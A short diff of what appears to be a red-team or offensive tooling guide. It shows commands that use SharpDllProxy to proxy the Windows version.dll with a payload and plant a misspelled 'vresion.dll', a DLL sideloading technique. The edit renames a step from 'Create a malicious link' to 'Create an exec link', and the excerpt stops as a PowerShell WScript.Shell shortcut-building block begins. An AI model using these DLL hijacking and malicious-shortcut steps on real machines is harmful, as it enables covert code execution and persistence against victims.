@@ -48,7 +48,7 @@ Cmd > SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload OneDrive
 Cmd > move output_version\tmp1F94.dll C:\out\vresion.dll
 ```
 
-Create a malicious link (also [here](https://gist.github.com/mttaggart/eb2ba020b8816cfe3da4cfd835240b7d)):
+Create an exec link (also [here](https://gist.github.com/mttaggart/eb2ba020b8816cfe3da4cfd835240b7d)):
 
 ```powershell
 $obj = New-object -ComObject wscript.shell
